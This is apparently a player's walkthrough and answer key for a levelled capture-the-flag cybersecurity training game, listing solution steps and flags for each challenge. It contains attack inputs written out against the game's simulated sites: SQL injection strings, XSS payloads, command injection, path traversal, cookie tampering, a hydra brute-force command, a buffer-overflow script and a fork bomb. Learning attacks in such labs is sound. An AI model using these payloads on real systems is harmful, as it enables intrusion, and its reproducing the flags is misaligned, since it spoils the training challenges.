# HQ Base

### Level 1

- L1C1 Social Secret
    - We can see that his username is *`lars_1986`*
    - Lets assume his Bday is 1986. So his age is 37 and if we enter that we get the flag
    
    Flag; Varies
    
- L1C2 Broken Banks
    
    On where it says “[*accounts@cloudninebankk.com](mailto:accounts@cloudninebankk.com)”* click the part that says “bankk” and you will get the flag
    
    Flag: Varies
    
- L1C3 Happy Customers
    - Each number corresponds with a number in the alphabet (ex. A = 1, B = 2, C = 3) once you decode it you will get the flag.
    
    Flag: wheel
    
- L1C4 Race To Where
    - if you CRTL + A you can see it tell you to go to *`/secret.html`* and the flag will be there
    
    Flag: Varies
    
- L1C5 Mixed Messages
    - The message in the email
        
        *IBEK OCLLCEITNO EW LPNA OT ATEK SI LBEU RO EYLLWO*
        
    - The message is scrambled (isn’t based on a cipher just mixed up)
    
    Flag: blueyellow
    
- L1C6 Executable
    - In the image you need to find the executable in the list.
    
    Flag: old-bike-parts.com
    
- L1C7 Secret Caesar
    - Use a site like [this](https://www.dcode.fr/ascii-shift-cipher) and enter each reference number until you find one that starts with “bar”
    
    Flag: barstem
    
- L1C8 Hidden Report
    - Click *Generate Report* and we can see that the button sends us to a link of our account so what if we modify the URL from *`/account/transactions-user-456.txt`* to *`/account/transactions-user-1.txt`* to find the first users info to get the flag
    
    Flag: Varies
    
- L1C9 Bike Fan
    - Inspect the broken image by scrolling below and edit it to add *.jpg* this is what it should look like “*src="/assets/challenge/W0009/assets/images/challenge-acbblog-bike-5.**jpg***”
    
    Flag: XVBHGJKLUTYR
    
- L1C10 Horrible Hats
    - If we take the hex values on the website and use the ASCII table to decode them we can uncover the secret message.
    
    Flag: bottle
    
- L1C11 Tower of Wheels
    - Using the JavaScript function below we can move the disk to solve the puzzle or run **`cheat()`** and we get the flag without doing any work.
    
    Flag: Varies 
    
- L1C12 Binary Bike Lock
    - We have two binary values that we have to add together. We can convert them into decimal values by using a site like [this](https://www.dcode.fr/binary-code). If we take the 2 decoded values and add them we get our answer which will give our flag.
    
    Flag: Varies
    

### Level 2

- L2C1 Decryption Ring
    - You need to decrypt the cipher using a site like [this](https://www.dcode.fr/rot-13-cipher) and once decrypted you will get “*GANG PLANNING HEIST TONIGHT AT VOLTRIDE*”
    
    Flag: VOLTRIDE
    
- L2C2 Loopy Login
    - Click on the padlock in the top left corner to get the flag
    
    Flag: Varies
    
- L2C3 Secret Pages
    - Change the URL from *`https://www.slootmaekersbikefactory.com/hidden/secret-plans.php?user=lars`* to *`https://www.slootmaekersbikefactory.com/hidden/secret-plans.php?user=**admin**`* to get admin access
    
    Flag: READYSETGO!
    
- L2C4 Too Much Text
    - To find the flag you need to CRTL + F and search `code` to find the flag.
    - Helpful hint: Use CRTL + F
    
    Flag: cvgtredfghtr
    
- L2C5 More Broken Bicycles
    - Inspect the broken image and change the .gif to a .jpg to get the flag
    
    Flag: VCBHYERDFGEW
    
- L2C6 Broken Click
    - To solve change the URL from *`/login`* to *`/adminarea/login`*
    
    Flag: Varies
    
- L2C7 Hard Hash
    - To solve use a site like [this](https://hashes.com/en/decrypt/hash)  and enter the hash and in return you should get this `1c1707e8a20719056bfc9a232527c5bd:cyclist:MD5`
    
    Flag: cyclist
    
- L2C8 Encrypted Message
    - Using the key in the email encrypt the message. You should get this “***LFSL RFD PSTB DTZW NIJSYNYD FGTWY FGTWY RJJY FY XFKJ MTZXJ G”*** which you need to send to get the flag.
    
    Flag: Varies
    
- L2C9 Fingerprints
    - Enter the pin 2475 to get the flag
    
    Flag: Varies
    
- L2C10 Useful Hack
    - Download the wordlist and try every single username and password (Which is `aspen_van_whistlethorn` & `cyclepower1999`
    
    Flag: Varies
    
- L2C11 Under Attack
    - Change the Password MIN Length to `16`
    
    Flag: Varies
    
- L2C12 User Who
    - Use the command `whoami` to get the username and you will get the flag
    
    Flag: borisvanwitterson
    

### Level 3

- L3C1 A Secret Rendezvous
    - Move the bars until the top says `WEAR`
    
    Flag: TRONDHEIM
    
- L3C2 Lucky Throw
    - Keep reloading the page until you roll a double.
    
    Flag: Varies
    
- L3C3 Chopper Check-in
    - If you look around you will find a comment about someones b-day a week from now.
    - The comment say that “*Meet up to plan Toni's bday a week from today”* with that info scroll up his location history to find the number of the building.
    
    Flag: 6734
    
- L3C4 Confused
    - Use a site like [this](https://www.togglecase.com/reverse_text) to decode the backwards text and you will get `SHOULDWETARGETVEHICLEXYUGHEDITLOOKSTHEBEST`
    - Using the decoded text find the identifier
    
    Flag: XYUGHED
    
- L3C5 Secret Source
    - if you look around for a `<script> </script>` and click on it to find the username and password mention there.
    - User: `aksel` Pass: `Rockstar99!`
    
    Flag: Varies
    
- L3C6 Corrupted
    - Look at the file through notepad (I used VScode) and you will see the flag at the bottom.
    
    Flag: 3N3drLWmwrxpWphs (this may or may not work)
    
- L3C7 Route into the Router
    - Using Moogle in the challenge search for the default login of the router
    - Default Login - Username: `admin` Password: `password`
    
    Flag: Varies
    
- L3C8 Password Postulation
    - Add a capital letter in front and a 1 at the end. The password is `Evergreen1`
    - Flag: Varies
- L3C9 Snake Charmer
    - To run the Python program use the command `python passgen.py`
    
    Flag: Varies
    
- L3C10 The Competitor Revealed
    - Enter a bunch of letters until it turns green and keep doing it until you get the company name
    - I personally just spammed my keyboard until it turned green lol
    
    Flag: ASBOR
    
- L3C11 Big Transfer
    - Manipulate the URL with the details provided
    - The URL should be `https://www.bankwithglobal.com/transfer?amount=1000&from=cpatestsender&to=cpatestreceiver`
    
    Flag: Varies
    
- L3C12 Dante In Command
    - Use the command `ls` and you will find a program called passcrack and run it using `./passcrack`
    - Flag: Varies

### Level 4

- L4C1 A Helping Hand
    - So the password is hidden in the pdf but to solve just CRTL + A and paste it into a notepad and you can see the password which is the flag.
    
    Flag: JohnyNumber5@
    
- L4C2 Arnold Chopper?
    - This challenge is very time taking, but read the field manual on the Arnold cipher
    
    Flag: Puppet
    
- L4C3 Photobomb
    - Download and change the file extension of the image to a `.txt` and open it with a notepad application and CTRL + F to find the flag.
    
    Flag: Br33zyAlp1ne
    
- L4C4 Upgrades? Paaa!
    - Go into the console and type the commands `username` and type `password` . These commands will give you the username and password to get the flag
    - Username: `aksel` Password: `t1mberl4nd-el33t`
    
    Flag: Varies
    
- L4C5 A Dangerous Contact
    - Arrange it like this `’)’ SELECT first_name, last_name, email, message FROM messages;—` to get the flag
    
    Flag: Wolsen
    
- L4C6 Maggie’s File
    - For this challenge use the command `ssh maggie@192.162.132.199` and login with the password. Use the command `ls` to find the file name
    
    Flag: secretcodes_v7.txt
    
- L4C7 Bendikke Loves Axes
    - Head to the login page on the bottom right and inspect the log in button. She left a comment stating that “Username is name of favourite axe, password is same backwards!”
    - If we look on her posts we can find the name of her favorite axe which is “thor”
    - Username: thor Password: `roht`
    
    Flag: Varies
    
- L4C8 Phishing For Flemming
    - Using OSINT look around the webpage to find info about him to fill in the blanks in the email.
    - The answers are `Valerie(Middle Name)`, `Trondheim`, `June`, `C`, `R`, `Barneys`, and `Seaview`.
    
    Flag: Varies
    
- L4C9 Lockdown
    - Inspect on the button and change `disabled="”` to `enabled="”`
    
    Flag: Varies
    
- L4C10 Lost But Not Forgotten
    - Download every single one and find the one that doesn’t show an image which is `cat-gif-06.gif` then open it with a Notepad app
    
    Flag: ebzMvS19hrRmIkgN
    
- L4C11 Cookie Jar
    - Click on the cookie in the top right corner to modify cookies and set it to `0` as normally admins have their value as `0`.
    
    Flag: Varies
    
- L4C12 Bad Kitty
    - If you look at the last .gif you can find some numbers that flash. Using a site like this we can see each individual frame and each individual number and those numbers are the flag
    
    Flag: 85980
    

### Level 5

- L5C1 Perplexed By Pixels
    - Start analysis and subtract the difference(Ex. (30,25,31) - (0,0,0))
    - Enter each solution into the ASCII Converter
    
    Flag: vqkcz
    
- L5C2 Word On The Street
    - Use the command below to find out the file extension(.pdf) and change it to get the flag
    - Command: `file file.zip`
    
    Flag: ToHF2wYjvqxv4CpD
    
- L5C3 Shinji's Drone
    - Click enter to get the URL you need to modify and change `?loggedin=false` to `?loggedin=true` to get the flag
    
    Flag: Varies
    
- L5C4 Out Of Sight
    - Use `ls -a` to also see hidden files and run `cd .secret-files` and `cat flag.txt` to get the flag.
    
    Flag: Varies
    
- L5C5 Zapped
    - Inspect the page to find a comment with a password hash (`36ABC61C95B4B4F2BF7568BA4A62386176AF46A0`) and use a site like [this](https://hashes.com/en/decrypt/hash) to decrypt the hash
    - Password: `charlie123`
    
    Flag: Varies
    
- L5C6 File Found
    - THIS CHALLENGE IS SIMILAR TO L5C2
    - Use the command `file unknown.xml` which will tell us that it is a .jpeg. With that knowledge change the file extension to get the flag
    
    Flag: uLeNsPecLaNd
    
- L5C7 Shopping for Secrets
    - `ls` to find the file we need to grep and run `grep kazuya 182k_accounts_rip.txt` to get the flag.
    
    Flag: Varies
    
- L5C8 Rattlesnake
    - Look inside the `.py` file with a code editor to get the flag
    
    Flag: 8&0QA0Vd%&9x4Jx
    
- L5C9 Yakoo Cars
    - Create a cookie with the cookie name `user` and the cookie value `Yaka Matsu` and save it to get the flag
    
    Flag: Varies
    
- L5C10 T-Shirt Triva
    - To solve this put it through a qr code scanning website like [this](https://scanqr.org/) and you will get the flag.
    
    Flag: b6fJbGR8fssuxSmH
    
- L5C11 Baffled By Browsers
    - Create a custom emulated device named `Orion` with the resolution set to `1920x1080` and with the user agent string also set to `Orion`
    
    Flag: Varies
    
- L5C12 Dangerous Comment
    - Using command injection we can run linux commands with a semicolon then the command we want to run in the comment box. ex. `;ls`. If we were to run `;ls` we can see all the directories and so lets run `;cat escape_plan.txt` and in there we can find the flag.
    
    Flag: Varies
    

### Level 6

- L6C1 Rezapped
    - This challenge is similar to L4C4
    - go into the console and type `password` to get the password
    
    Flag: Varies
    
- L6C2 Truck Stop
    - When we first look at the site everything is reversed (Hint: This info is useful later). To solve, first click start and write down all the letters shown and reverse those letters to get the flag.
    
    Flag: Varies
    
- L6C3 Meeting Momoko
    - Use a site like [dcode.fr](https://www.dcode.fr/atbash-cipher) to decode the atbash cipher. Enter the ciphered text into the site to get the flag.
    
    Flag: Amazing Cherry Blossom Coffee
    
- L6C4 Lost Key
    - The file command tells me that it is a .pdf and and changing it gives us the flag
    
    Flag: 6Zmnbx6tXOvZUywVXR
    
- L6C5 Running Man
    - Use the command `nc services.cyberprotection.agency 8203` and you will get the flag
    
    Flag: $G1b$6nQ81O$fTg
    
- L6C6 Heroka DB
    - You need to enter this command `WHERE = 'Heroka' OR 1=1’` to get the flag
    - `WHERE` allows to find a specific search term and `1=1` makes it true
    
    Flag: Varies
    
- L6C7 Hush Fund
    - I used [this](https://www.rapidtables.com/convert/number/hex-to-ascii.html) website and decode the account number which was the flag
    
    Flag: 7244097351
    
- L6C8 Junya Who
    - SSH into the server
    
    ```bash
    # this is the command (ily phong)
    grep "junya" -i -r
    ```
    
    - flag: Kawasaki
- L6C9 QR.gif
    - Use a GIF Splitter like [this](https://ezgif.com/split) and scan each individual QR and each QR has a part of the flag. Put each part together and you will get the flag
    
    Flag: mAr10_i5_a_br0
    
- L6C10 Custom Plates
    - View the page source
    1. Username: `yk1`
    2. Password: `pass3828go123`
    
    Flag: Varies
    
- L6C11 Still Hiding
    - SSH into the server and enter `ls -a` to see the directories, then `cd …` to find `camouflage` and `cat camouflage` to get the flag
    
    Flag: gonein404seconds
    
- L6C12 Brute Strength
    - Modify the python script to also have not only the lowercase alphabet but also the uppercase alphabet and run it in the save directory as `planz.zip`
    - Like this `alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ’`
    
    Flag: LPxuceJtd5nLry1YhB
    

### Level 7

- L7C1 Dot Dot Dash
    - Copy all the morse code and put it in [this](https://www.dcode.fr/morse-code) site. You will get “*THIS IS GONZALEZ EXPLORING ENTRY OPTIONS ABOARD SHIP CALLED ESCABAR OVER”* and the ship name is the flag.
    
    Flag: ESCABAR
    
- L7C2 Hidden Boats
    - If we look in the page source and CTRL + F the word `planned` this shows us how we can go to the `extra.txt` file. With this knowledge manipulate the URL to get to `extra.txt`
    - Your URL should look like this `https://www.boatcabs.com/scheduled?file=extra.txt`
    
    Flag: XZ8762
    
- L7C3 Docking Port
    - If we use `nc -h` to read the command we can see the `-l` being useful and so if we enter `nc -l 1337`, we get the flag
    
    Flag: Varies
    
- L7C4 Pedro’s Password
    - Login to the server and run `cat /etc/passwd` to find the flag at the top of the page.
    
    Flag: nanDSiONEramPoC
    
- L7C5 Quick Drop
    - The code is in Base64. I used cyberchef to decode it. Once you have recieved the code send it in the messages system to get the flag.
- L7C6 Miguel the Moneyman
    - Run the command `python3 -m http.server –bind 127.0.0.1 800` and enter `http://10.10.127.202:8000` into the email to get the flag.
    
    Flag: Varies
    
- L7C7 Developer Disaster
    - Run the command `curl https://slowlaneshipping.com/latest -d 'UserID'` to get the flag
    
    Flag: undelayUndelayArriba
    
- L7C8 Breaking Bottles
    - After reading the field manual on ***Filters in web applications,*** it tells us how we can still use command injection. With this knowledge I entered  `123 | ls -a` into the message box. From this I could see the file and Iooked in `cola_recipe.txt` with `123 | cat cola_recipe.txt` to find the flag.
- L7C9 Bash the Botnet
    - The **Related Field Manual Entries** hinted that we will need to be reading history so I used the `history` command and the flag with manifested upon me.
    
    Flag: ZCHqNLTmsP6kAEZkezCa4ebQ
    
- L7C10 All Zipped Up
    - In your Python Script the `first_half_password` should be Cola and your `alphabet` should be `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890` like in *fig 1.*
    - *fig 1.*
        
        ![Screenshot 2023-12-05 at 4.33.58 PM.png](HQ%20Base%20ff9a26e45022442fa238cc6727d813b2/Screenshot_2023-12-05_at_4.33.58_PM.png)
        
    
    Flag: luDS3xAMuZqo2gmuMih
    
- L7C11 Secret Spreadsheet
    - Modify the code already pre-provided, it should look like the one below.
    - Modified Python Code
        
        ```python
        import urllib.request, urllib.error, urllib.parse
        
        link = "http://www.chiquitooenterprise.com/password"
        
        cipher = urllib.request.urlopen(link).read().decode('utf-8')
        revString = cipher[::-1]
        
        answer = "http://www.chiquitooenterprise.com/password?code=" + revString
        response = urllib.request.urlopen(answer)
        response = response.read()
        print(response.decode('utf-8'))
        ```
        
    
    Flag: Varies
    
- L7C12 Password Pickle
    - download the file on kali, make sure your up to date.
    - Then run `echo password | ./program-x86` and you will get the flag
    
    Flag: TkxZxVxCtPUL7SHxt7a
    

### Level 8

- L8C2 Port Service
    - Use Netcat to get access to the server and look for the flag.
    - Command: `netcat services.cyberprotection.agency 5737`
    
    Flag: tZH9VW6zFgYkasEkEczVjZMX
    
- L8C3 Boat Missing
    - View the images metadata and look for the coords. Take the 2 absolute values (which is 97 & 24) and add them to get the flag.
    
    Flag: 121
    
- L8C8 Float to the top
    
    Flag: U0ea0BQrnjAnCPsgLTT
    
- L8C10 Shipping Lanes
    - Use the Konami Code to access the site
    - Konami Code:`up up down down left right left right B A`
    - Flag: Varies
- L8C11 Corrupted Corruption
    - add the bytes `50 4B 03 04`, extract the .zip and run the file with `./`
    
    Flag: vVxzod8WwRszbtM7PAt
    
- L8C12 Hidra
    - Run this command `hydra -l secure_user -P words.txt ftp://services.cyberprotection.agency:2121`
    - Then use [net2ftp.com](https://www.net2ftp.com/index.php) to connect to the server with the username: secure_user and the password: mutineers and open flag.txt for the flag:
    
    Flag: ySa6IwHaI4rIGPDv
    

### Level 9

- L9C3 Hidden Centrifuge
    - Use URL manipulation and go to robots.txt
    - then go to testtubes.html
    
    Flag: Varies
    
- L9C4 Bunsen Burners
    - type `<script>alert("Kaboom!");</script>` in the comment box
    - Common ERROR:  Make sure there is no spaces
    
    Flag: Varies
    
- L9C5 Hayka
    - Use the php file below and upload it then add `/cyberstartL9C5.php` to the url
    - PHP file
        
        ```php
        <?php
         echo "b1n4ry"; 
        ?>
        ```
        
    
    Flags: Varies
    
- L9C6 Mission Extension
    - ssh into the server and `cd Contents` and run `file *` and look for a jpg which is `M5KDAN44`.
    - Use a site like [this](https://www.filestash.app/sftp-browser.html) and login to the server, then search for `M5KDAN44`, then download the file and change the file extension of the file to a `.jpg` and look for the SN and that’s the flag.
    
    Flag: 0207F9
    
- L9C8 Bogdan’s Data
    - Run `nc services.cyberprotection.agency 3166` and the first number is `10` and the second number is `firstNum`
    
    Flag: ROCTrOPlAclukelAShuENWaCEleCTO
    
- L9C9 File Hunt
    - SSH into the server, `cd ..` to root, `cd etc`, then use `ls -lt` , then find the file created at 22 Nov 2015 at 8.00pm and `cat protocol` to get the flag
    
    Flag: 5iF4fG0vnsRHEdGfzMLSvXyQ
    
- L9C10 Code Attack
    - Make sure the `.exe` is in the same directory as the `.py` is in.
    - Python code
        
        ```python
        import subprocess
        subprocess.run('chmod 701 program-x86_12', shell=True) #give file permissions
        subprocess.run('file program-x86_12', shell=True) #file type
        for x in range(0, 9999):
            subprocess.run(f'./program-x86_12 {str(x).zfill(4)} ', shell=True)
        ```
        
    
    Flag: 8YBqF1vjnplFDCRomom
    

### Level 10

- L10C2 Calling Yaroslav
    - Type in **1 5 2 4 2 0 5 6 as passcode**
    
    Flag: Varies
    
- L10C5 Matryoshka
    - Use the command `man -K matryoshka` to get the flag
    - The `man` command is used to get a manual of a certain command. The `-K` option is used to search for text in all pages
    
    Flag: 4XAEhDJvZBuine9CCzmzcYmR
    
- L10C7 Kapa's Hidden Secrets
    - Run the command `$(ls -l ..)` to list the files in the server, and run `$(cat ../flag.txt)` to open flag.txt
    
    Flag: Varies
    
- L10C10 Snakes in Motion
    - Fixed Python Script
        
        ```python
        # Here is the modified Python script for L10 C10 for the Headquarters Level
        
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        import base64
        
        BLOCK_SIZE = 32
        PADDING = b'{'
        
        # Encrypted text to decrypt
        encrypted = "uqX82PBZ8pi1fvt4GLHYgLs50ht8OQlrR1KHL2teppQ="
        
        def decode_aes(key, e):
            cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(base64.b64decode(e)) + decryptor.finalize()
            return decrypted.decode('latin-1').rstrip(PADDING.decode('latin-1'))
        
        # Load the dictionary file with explicit encoding
        with open('words.txt', 'r', encoding='utf-8') as file:
            dictionary = [line.strip() for line in file]
        
        for secret in dictionary:
            if secret[-1:] == "\n":
                print("Error, new line character at the end of the string. This will not match!")
            elif len(secret.encode('utf-8')) >= 32:
                print("Error, string too long. Must be less than 32 bytes.")
            else:
                # create a key using the secret
                key = secret.encode('utf-8') + (BLOCK_SIZE - len(secret.encode('utf-8')) % BLOCK_SIZE) * PADDING
        
                # decode the encoded string
                decoded = decode_aes(key, encrypted)
        
                if decoded.startswith('FLAG:'):
                    print("\n")
                    print("Success: "+secret+"\n")
                    print(decoded+"\n")
                    break  # Exit the loop if the correct password is found
                else:
                    print(f'Wrong password: {secret}')
        
        print("Finished trying all passwords.")
        ```
        
    - To run the python script use the `python3` command
    
    Flag: ozZdCrFTsOMoC4m5FMd
    
- L10C12 Dear John
    - Run the command: `john --wordlist=words.txt -stdout -rule >>file.txt`, Then: `chmod 701 program-x86`, after that `./program-x86 file.txt`
    
    Flag: CG3GPtycLfxdzYyi2xp
    

### Level 11

- L11C1 Port of Call
    - Run `sudo nmap -p 14000-15000 services.cyberprotection.agency` to get the port and `run sudo nc -v -n 54.75.188.181 14444` to get the flag
    
    Flag: Dc4GChlyxd3jkTmapRcQ0S
    
- L11C2 Nightclub Rendezvous
    - Wrote a python script that added 1 to every number and used those numbers and added them to a Decimal to ASCII converter
    - Python script
        
        ```python
        numberlist = [81, 95, 33, 108, 95, 26, 103, 95, 95, 110, 99, 104, 97, 26, 91, 110, 26, 110, 98, 95, 26, 60, 91, 92, 91, 108, 111, 109, 101, 99, 26, 104, 99, 97, 98, 110, 93, 102, 111, 92, 26, 99, 104, 26, 70, 105, 104, 94, 105, 104, 26, 91, 110, 26, 43, 43, 106, 103, 26, 110, 98, 99, 109, 26, 95, 112, 95, 104, 99, 104, 97, 40]
        
        numberlist2 = []
        
        for i in numberlist:
          x = i+6
          numberlist2.append(x)
        
        print(numberlist2)
        ```
        
    
    Flag: Babaruski
    
- L11C3 The Insider
    - The password is in plain text in strings LOL
    - Password: Reck1t
    
    Flag: hvMjw1CLRDcZZzTqO2k
    
- L11C4 Binary Battle
    - Use the command `strings strings3-x86 | xargs -n 1 ./strings3-x86` to get the flag
    
    Flag: 3rtzdrp0nr3y7qzqiblm7mdw
    
- L11C5 Art Thief
    - Take the largest image and add `FF D8 FF E0` to fix its header and you will get the flag
    
    Flag: MaGiC_NuMbErs
    
- L11C6 Benjamin the Brute
    - Use the code below to solve the challenge
    - Python Code
        
        ```python
        import requests
        
        with open("results.txt", "w+") as f:
          for x in range(77, 79):
            post_params = {"userID":24,
                          "sessID": x}
            URL  = "https://www.bondogge.com/createPost?"
            data = requests.post(URL, post_params).text + "\n"
            f.write(data)
        f.close()
        ```
        
    
    Flag: br1ti5h.bulld0gZ
    
- L11C7 Stepping Up
    - The Solution (Not written by me)
        - Changed "de4dc0de" to octal and added 0's to overflow.
        
        `./program-x86 $(printf "00000000000000000\336\300\115\336")`
        
        - The secret is de4dc0de
    
    Flag: IilDCuiVBmySueH37tB
    
- L11C8 Unsafe Deposit Box
    - Change the `deposit_user` cookie’s value to `32f35nh98gf3hy9085g398g35y98f43h9f3g234f27w624`
    
    Flag: Varies
    
- L11C9 Vicious Voicemail
    - Put the 1st file into [this](https://futureboy.us/stegano/decinput.html) website and it gave me the flag.
    
    Flag: sTg9UtlFLRUOXt7tTSS
    
- L11C10 Exposure
    - Turns out the website uses a vulnerability call the “CVE-2012-2399” vulnerability
    - To get the flag add the red text below to the end of the URL
    
    `?buttonText=%3Ca%20href=%27javascript:alert(document.cookie)%27%3EClick%20me%3C/a%3E`
    
    Flag: Varies
    
- L11C11 Cryptonite
    - Run `cryptonite -n; ls -a` to list all files and run `cryptonite -n; cat security-blueprints.txt` to get the flag
    
    Flag: Varies
    
- L11C12 Open Box
    - Solution (not mine)
        
        fake browser url is static, so probably js/cookie/other injection. `SQL_SESSuser` is unusual ("hinted" in challenge.js)
        
        sql injection is the first guess here, so we try to do it through the cookie ([reference](https://resources.infosecinstitute.com/topic/cookie-based-sql-injection/)):
        
        ```
        document.cookie = "SQL_SESSuser=342423961827' OR 1=1;"
        
        ```
        
        this works and we're in! the flag is billy's user, `billy_goats_gruff`
        
        there's also an admin bypass found in `/assets/challenge/W0121/assets/js/challenge.dc792968.js`:
        
        ```
        if (eval(e)) {
          const W = n(435, "Ftd(")
            , c = ["user", n(427, "LGKA"), n(418, "zC[m"), n(444, "N[#u")]
            , o = n(442, "#V[L") + c[2] + W + "=" + document[n(433, "U53!")](n(425, "Sw%q"))[n(437, "NH!q")].jscode
            , t = n(416, "LGKA") + (10 * document[n(432, "4I$j")](n(441, "zAMg"))[n(420, "Ep(Q")].jscode - 42) / 1337;
          window[n(445, "VkX(")] = "" + o + t
        }
        
        ```
        
        deobfuscating the above reveals that solving the challenge will set the url parameters to `?adminMode=9882259200&ref=73913681.3448018`; we can change this manually to bypass the injection
        
    
    Flag: billy_goats_gruff
    

### Level 12

- L12C1 Spam Robot
    - Scroll down until you see a cluster of logs that are the same length and james_joseph appears repeatedly. This is seen in *figure 1.*
    - *Figure 1.*
        
        ![Screenshot_2023-12-04_20-24-02.png](HQ%20Base%20ff9a26e45022442fa238cc6727d813b2/Screenshot_2023-12-04_20-24-02.png)
        
    
    Flag: james_joseph
    
- L12C2 Nosey Robot
    - Change this `char command[8]` to this `char command[16]`
    
    Flag: Varies
    
- L12C3 Account Roulette
    - Enter `document.cookie = "speek_sess_id=49”` into the console and reload the page to get the flag
    
    Flag: Varies
    
- L12C4 Change of Plan
    - Python Code
        
        ```python
        # pip install pycryptodome
        from Crypto.Cipher import AES
        import base64
        
        BLOCK_SIZE = 32
        
        PADDING = '{'
        
        # Encrypted text to decrypt
        encrypted = "xpd4OA7GZYDfn4lTMJW/EEqgp26BlgjxsTonc1Elcgo="
        
        def decode_aes(c, e):
            return c.decrypt(base64.b64decode(e))#.decode('latin-1').rstrip(PADDING)
        
        def isprintable(s, codec='utf8'):
            try: s.decode(codec)
            except UnicodeDecodeError: return False
            else: return True
        
        with open('words.txt','rb') as h:
            secrets = [line.strip().decode() for line in h.readlines()]
        
        for secret in secrets:
            if secret[-1:] == "\n":
                print("Error, new line character at the end of the string. This will not match!")
            elif len(secret.encode('utf-8')) >= 32:
                print("Error, string too long. Must be less than 32 bytes.")
            else:
                # create a cipher object using the secret
                cipher = AES.new(secret.encode('utf-8') + ((BLOCK_SIZE - len(secret.encode('utf-8')) % BLOCK_SIZE) * PADDING).encode('utf-8'), AES.MODE_ECB)
        
                # decode the encoded string
                decoded = decode_aes(cipher, encrypted)
        
                if isprintable(decoded):
                    print('Decoded: '+decoded.decode()+"\n")
                    break
        ```
        
    
    Flag: iQmDIXlDT7N2YgReCOM
    
- L12C5 The Robot Speaks
    - On line 14 change this `DoMore: add byte [ecx],af` to this `DoMore: add byte [ecx],al`
    
    Flag: Varies
    
- L12C6 Remote Unlock
    - The code I used
        
        ```python
        import socket
        
        # Connect to Host
        host = ('services.cyberprotection.agency', 9999)
        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.connect((host))
        
        # Recieve Values
        data = Sock.recv(20)
        item = data.strip("\n")
        items = data.split()
        print items
        
        # Math
        num = (int(items[0]) * int(items[1])) / int(items[2])
        
        # Send back to server 
        Sock.send(str(num))
        
        # Recieve Flag back
        print Sock.recv(1024)
        
        Sock.close()
        
        ['34679', '7066', '15668']
        ```
        
    
    Flag: 917035HrQ0PODo#
    
- L12C7 Coffee Robot
    - SIMILAR TO L10C7
    - Run `$(ls -a)` to list the files. Run `$(ls ..)` to go up a dir. and if we were to `ls -a` we see `.robot_sketches.txt` .
    - run `$(cat ../robot-bank-job/.robot_sketches.txt)` to get the flag
    
    Flag: Varies
    
- L12C8 Fork in Road
    - Enter `cryptonite -n; :(){ :|: & };:`in the terminal
    
    Flag: Varies
    
- L12C9 Open Port
    - Using Nmap find the open port and run `nc -u -v services.cyberprotection.agency 19991` to get the flag
    
    Flag: 3qwLD3tzAqLdCUdPSGZ1Hb
    
- L12C10 Catch and Throw
    - Read the tip in the briefing and use that and if you want use curl
    
    Flag: 7463547834
    
- L12C11 Stop and search
    - Convert the script into hexadecimal and enter it.
    - Enter this`3c7363726970743e616c6572742827536561726368207468697321212127293c2f7363726970743e`
    
    Flag: Varies
    
- L12C12 Multiple Boxes
    - Note: The Vulnerability is `CAPEC-79`
    - enter this into the url [`https://www.easy-filebox.com/u/2374682/user/files..%2F..%2F..%2F..%2F..%2F..%2F..%2F`](https://www.easy-filebox.com/u/2374682/user/files..%2F..%2F..%2F..%2F..%2F..%2F..%2F)
    
    Flag: Varies
    

### Level 13

- L13C1 Spam for Dinner
    - First set your url to [`https://jiaozi-restaurants.com/booking-form?venue=shanghai&seedID=](https://jiaozi-restaurants.com/booking-form?venue=shanghai&seedID=)1:1:1:1` and then enter the captcha then change the url to [`https://jiaozi-restaurants.com/booking-form?venue=shanghai&seedID=](https://jiaozi-restaurants.com/booking-form?venue=shanghai&seedID=)2:2:2:2` and then enter the new captcha and keep doing this 3 more times for a total of 5 times and you should get the flag.
    
    Flag: Varies
    
- L13C2 Bypass
    - use command `nc services.cyberprotection.agency 13880`
    - then hold enter till you see welcome and then type `flag` and you will get the flag
    
    flag: ZhSX9onhPC7y1LTqhE
    
- L13C3 Run Server Run
    
    ```bash
    user@localhost:~$ ncat services.cyberprotection.agency 13777 &>file.out
    
    user@localhost:~$ cat file.out | xxd
    00000000: 1f8b 0800 a252 2c62 02ff 73f3 7174 b752  .....R,b..s.qt.R
    00000010: c80d 732b a848 0a4d f6b5 7076 4a32 364f  ..s+.H.M..pvJ26O
    00000020: cb0d 0200 1a5f 45fe 1800 0000 0a4e 6361  ....._E......Nca
    00000030: 743a 2042 726f 6b65 6e20 7069 7065 2e0a  t: Broken pipe..
    
    user@localhost:~$ binwalk -e file.out
    
    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             gzip compressed data, maximum compression, last modified: 2022-03-12 07:58:26
    
    user@localhost:~$ cd _file.out.extracted/
    
    user@localhost:~/_file.out.extracted$ cat 0
    FLAG: mVFpxbUcM8CBb37fmR
    ```
    
    Flag: mVFpxbUcM8CBb37fmR
    
- L13C4 Server Strike
    - I ssh’ed into the server and looked around. Inside the `…` directory I found the file “weird” and used [this](https://www.filestash.app/sftp-browser.html) to download it onto my VM and ran `chmod +x weird` and when I `./` it, it told me I wasn’t `challenge011306` and so I added a user with that username and ran it and got the flag.
    
    Flag: 6pas0apcxasd7aswzzsapzla
    
- L13C5 Memories
    - The Python script below uses the pwn library for binary exploitation to send a buffer overflow payload to a running program, causing it to crash or execute unintended code. It then opens an interactive session with the running program for further debugging or exploration.
    - Python Code
        
        ```python
        #!/usr/bin/env python
        
        Import pwn
        
        io = pwn.process(“./program-x86”)
        
        io.send(b”A” * 156 + pwn.p32(0x80484b1))
        
        io.interactive()
        ```
        
    
    Flag: 4UPzOlkhlUBvY8bHikd
    
- L13C6 Binary Memories
    - Run the command `ltrace ./program-x86`
    
    Flag: r4nd4tfunall4is444dom
    
- L13C7 Seashell
    - I asked ChatGPT to decode the assembly code to plain text and toward the end there is plain text that says `shellcode_is_data_data_is_shellcode` using the python code below I got the flag.
    - Python code
        
        ```python
        counter = 0
        data = "shellcode_is_data_data_is_shellcode"
        
        while counter <= len(data):
            print(data[counter], end="")
            counter += 2
        ```
        
    
    Flag: seloei_aadt_sseloe
    
- L13C8 Hash’em
